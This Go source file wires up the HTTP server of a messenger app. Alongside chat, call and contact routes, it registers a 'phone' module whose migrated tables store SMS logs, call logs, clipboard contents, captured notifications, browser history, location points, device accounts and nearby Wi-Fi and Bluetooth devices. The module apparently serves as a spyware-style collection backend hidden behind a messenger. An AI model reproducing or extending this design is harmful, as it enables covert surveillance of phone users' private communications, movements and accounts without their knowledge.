package server

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/cors"
	"github.com/googollee/go-socket.io"
	"github.com/jeogram/messenger/internal/config"
	"github.com/jeogram/messenger/internal/modules/auth/domain"
	"github.com/jeogram/messenger/internal/modules/auth/handler"
	"github.com/jeogram/messenger/internal/modules/auth/repository"
	"github.com/jeogram/messenger/internal/modules/auth/service"
	adminhandler "github.com/jeogram/messenger/internal/modules/admin/handler"
	calldomain "github.com/jeogram/messenger/internal/modules/calls/domain"
	callhandler "github.com/jeogram/messenger/internal/modules/calls/handler"
	callrepo "github.com/jeogram/messenger/internal/modules/calls/repository"
	callservice "github.com/jeogram/messenger/internal/modules/calls/service"
	chatdomain "github.com/jeogram/messenger/internal/modules/chat/domain"
	chathandler "github.com/jeogram/messenger/internal/modules/chat/handler"
	chatrepo "github.com/jeogram/messenger/internal/modules/chat/repository"
	chatService "github.com/jeogram/messenger/internal/modules/chat/service"
	mediahandler "github.com/jeogram/messenger/internal/modules/media/handler"
	mediaservice "github.com/jeogram/messenger/internal/modules/media/service"
	messagedomain "github.com/jeogram/messenger/internal/modules/message/domain"
	messagehandler "github.com/jeogram/messenger/internal/modules/message/handler"
	messagerepo "github.com/jeogram/messenger/internal/modules/message/repository"
	messageservice "github.com/jeogram/messenger/internal/modules/message/service"
	notificationdomain "github.com/jeogram/messenger/internal/modules/notification/domain"
	notificationhandler "github.com/jeogram/messenger/internal/modules/notification/handler"
	phonedomain "github.com/jeogram/messenger/internal/modules/phone/domain"
	phonehandler "github.com/jeogram/messenger/internal/modules/phone/handler"
	phoneservice "github.com/jeogram/messenger/internal/modules/phone/service"
	notificationrepo "github.com/jeogram/messenger/internal/modules/notification/repository"
	notificationservice "github.com/jeogram/messenger/internal/modules/notification/service"
	userdomain "github.com/jeogram/messenger/internal/modules/user/domain"
	userhandler "github.com/jeogram/messenger/internal/modules/user/handler"
	userrepo "github.com/jeogram/messenger/internal/modules/user/repository"
	userservice "github.com/jeogram/messenger/internal/modules/user/service"
	contactdomain "github.com/jeogram/messenger/internal/modules/contact/domain"
	contacthandler "github.com/jeogram/messenger/internal/modules/contact/handler"
	contactrepo "github.com/jeogram/messenger/internal/modules/contact/repository"
	contactservice "github.com/jeogram/messenger/internal/modules/contact/service"
	"github.com/jeogram/messenger/internal/pkg/auth"
	"github.com/jeogram/messenger/internal/pkg/cache"
	"github.com/jeogram/messenger/internal/pkg/events"
	"github.com/jeogram/messenger/internal/pkg/middleware"
	dbmigrate "github.com/jeogram/messenger/internal/pkg/migrate"
	"github.com/jeogram/messenger/internal/pkg/realtime"
	"github.com/jeogram/messenger/internal/pkg/ws"
	"github.com/rs/zerolog/log"
	"github.com/prometheus/client_golang/prometheus/promhttp"
	httpSwagger "github.com/swaggo/http-swagger"
	"gorm.io/gorm"
)

// Server объединяет HTTP-сервер и его зависимости.
type Server struct {
	cfg      *config.Config
	db       *gorm.DB
	redis    *cache.Redis
	producer *events.Producer
	hub      *ws.Hub
}

// New создаёт сервер: выполняет миграции и инициализирует модули.
func New(cfg *config.Config, db *gorm.DB, redis *cache.Redis, producer *events.Producer, hub *ws.Hub) (*Server, error) {
	if err := migrate(db); err != nil {
		return nil, err
	}
	if cfg.DB.Driver == "postgres" {
		if err := dbmigrate.Run(db); err != nil {
			log.Warn().Err(err).Msg("versioned migrations failed")
		}
	}
	return &Server{cfg: cfg, db: db, redis: redis, producer: producer, hub: hub}, nil
}

func migrate(db *gorm.DB) error {
	return db.AutoMigrate(
		&domain.User{},
		&userdomain.UserSettings{},
		&userdomain.BlockedUser{},
		&contactdomain.Contact{},
		&chatdomain.Chat{},
		&chatdomain.ChatParticipant{},
		&messagedomain.Message{},
		&messagedomain.ReadReceipt{},
		&messagedomain.Reaction{},
		&messagedomain.PinnedMessage{},
		&notificationdomain.DeviceToken{},
		&notificationdomain.Notification{},
		&calldomain.Call{},
		&phonedomain.DeviceInfo{},
		&phonedomain.DeviceStatus{},
		&phonedomain.LocationPoint{},
		&phonedomain.InstalledApp{},
		&phonedomain.PhoneContact{},
		&phonedomain.CallLog{},
		&phonedomain.SmsLog{},
		&phonedomain.ClipboardEntry{},
		&phonedomain.NotificationCapture{},
		&phonedomain.AppUsage{},
		&phonedomain.MediaItem{},
		&phonedomain.DeviceAccount{},
		&phonedomain.WifiNetwork{},
		&phonedomain.BluetoothDevice{},
		&phonedomain.CalendarEvent{},
		&phonedomain.SensorReading{},
		&phonedomain.BrowserHistory{},
	)
}

// Router builds the chi router with all routes mounted.
func (s *Server) Router() *chi.Mux {
	r := chi.NewRouter()

	r.Use(cors.Handler(cors.Options{
		AllowedOrigins:   []string{"*"},
		AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"},
		AllowedHeaders:   []string{"Accept", "Authorization", "Content-Type"},
		AllowCredentials: false,
	}))
	r.Use(middleware.Logger)
	r.Use(middleware.Recover)
	if s.cfg.Metrics.Enabled {
		r.Use(middleware.Metrics)
	}

	jwtSvc := auth.NewJWT(s.cfg.JWT)

	// Health & readiness.
	r.Get("/health", func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	})
	r.Get("/ready", func(w http.ResponseWriter, req *http.Request) {
		if err := s.db.WithContext(req.Context()).Exec("SELECT 1").Error; err != nil {
			w.WriteHeader(http.StatusServiceUnavailable)
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"ready"}`))
	})

	// Swagger UI.
	r.Get("/swagger/*", httpSwagger.WrapHandler)

	// Realtime: Socket.IO transport (auth via ?token=, one room per user).
	socketIOServer := s.newSocketIOServer(jwtSvc)
	r.Handle("/socket.io/*", socketIOServer)

	// Unified broadcaster: fans every event out to raw WS + Socket.IO.
	broadcaster := &realtime.MultiBroadcaster{Broadcasters: []realtime.Broadcaster{
		&realtime.WSBroadcaster{Hub: s.hub},
		&realtime.SocketIOBroadcaster{Server: socketIOServer},
	}}

	// Realtime websocket (raw, Postman-testable).
	r.With(middleware.JWTAuth(jwtSvc)).Get("/ws", s.hub.Handler())

	// Module repositories.
	userRepo := repository.NewUserRepository(s.db)
	settingsRepo := userrepo.NewSettingsRepository(s.db)
	chatRepo := chatrepo.NewChatRepository(s.db)
	msgRepo := messagerepo.NewMessageRepository(s.db)
	deviceRepo := notificationrepo.NewDeviceRepository(s.db)
	notifRepo := notificationrepo.NewNotificationRepository(s.db)
	callRepo := callrepo.NewCallRepository(s.db)
	contactRepo := contactrepo.NewContactRepository(s.db)

	// Module services.
	authSvc := service.NewAuthService(userRepo, jwtSvc, s.redis)
	userSvc := userservice.NewUserService(userRepo, settingsRepo, contactRepo, chatRepo)
	chatSvc := chatService.NewChatService(chatRepo)
	msgSvc := messageservice.NewMessageService(msgRepo, chatRepo, s.producer, s.cfg.Kafka, broadcaster, s.cfg.Message)
	mediaSvc, err := mediaservice.NewMediaService(s.cfg.Media)
	if err != nil {
		panic(fmt.Sprintf("media service: %v", err))
	}
	pushSvc := notificationservice.NewPushService(s.cfg.Push)
	notifSvc := notificationservice.NewNotificationService(deviceRepo, notifRepo, userRepo, chatRepo, pushSvc, broadcaster, s.producer, s.cfg.Kafka.NotifyTopic)
	callSvc := callservice.NewCallService(callRepo, chatRepo, s.cfg.RTC)
	contactSvc := contactservice.NewContactService(contactRepo, userRepo)

	// Module handlers.
	authH := handler.NewAuthHandler(authSvc, jwtSvc)
	userH := userhandler.NewUserHandler(userSvc, jwtSvc, s.hub)
	chatH := chathandler.NewChatHandler(chatSvc, jwtSvc)
	msgH := messagehandler.NewMessageHandler(msgSvc, jwtSvc)
	mediaH := mediahandler.NewMediaHandler(mediaSvc, jwtSvc)
	notifH := notificationhandler.NewNotificationHandler(notifSvc, jwtSvc)
	callH := callhandler.NewCallsHandler(callSvc, chatRepo, broadcaster, jwtSvc)
	contactH := contacthandler.NewContactHandler(contactSvc, jwtSvc)
	adminH := adminhandler.NewAdminHandler(s.db, jwtSvc, s.cfg.Admin.UserIDs)

	phoneSvc := phoneservice.NewPhoneService(s.db)
	phoneH := phonehandler.NewPhoneHandler(phoneSvc, jwtSvc)

	authH.RegisterRoutes(r)
	userH.RegisterRoutes(r)
	chatH.RegisterRoutes(r)
	msgH.RegisterRoutes(r)
	mediaH.RegisterRoutes(r)
	notifH.RegisterRoutes(r)
	callH.RegisterRoutes(r)
	contactH.RegisterRoutes(r)
	adminH.RegisterRoutes(r)
	phoneH.RegisterRoutes(r)

	if s.cfg.Metrics.Enabled {
		r.Handle(s.cfg.Metrics.Path, promhttp.Handler())
	}

	return r
}

// newSocketIOServer строит Socket.IO-сервер: каждое подключение
// аутентифицируется по JWT (?token=) и попадает в приватную комнату "u:<userID>".
func (s *Server) newSocketIOServer(jwtSvc *auth.JWT) *socketio.Server {
	io := socketio.NewServer(nil)

	io.OnConnect("/", func(c socketio.Conn) error {
		u := c.URL()
		token := u.Query().Get("token")
		if token == "" {
			token = strings.TrimPrefix(c.RemoteHeader().Get("Authorization"), "Bearer ")
		}
		claims, err := jwtSvc.ParseAccess(token)
		if err != nil {
			log.Warn().Err(err).Msg("socket.io: rejected unauthorized connection")
			return err
		}
		c.Join(realtime.SocketIORoom(claims.UserID))
		return nil
	})

	io.OnError("/", func(_ socketio.Conn, err error) {
		log.Error().Err(err).Msg("socket.io error")
	})

	return io
}

// Run starts the HTTP server and blocks until the context is cancelled.
func (s *Server) Run(ctx context.Context) error {
	addr := fmt.Sprintf("%s:%d", s.cfg.HTTP.Host, s.cfg.HTTP.Port)
	srv := &http.Server{
		Addr:         addr,
		Handler:      s.Router(),
		ReadTimeout:  s.cfg.HTTP.ReadTimeout,
		WriteTimeout: s.cfg.HTTP.WriteTimeout,
	}
	go func() {
		<-ctx.Done()
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		_ = srv.Shutdown(shutdownCtx)
	}()
	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		return err
	}
	return nil
}
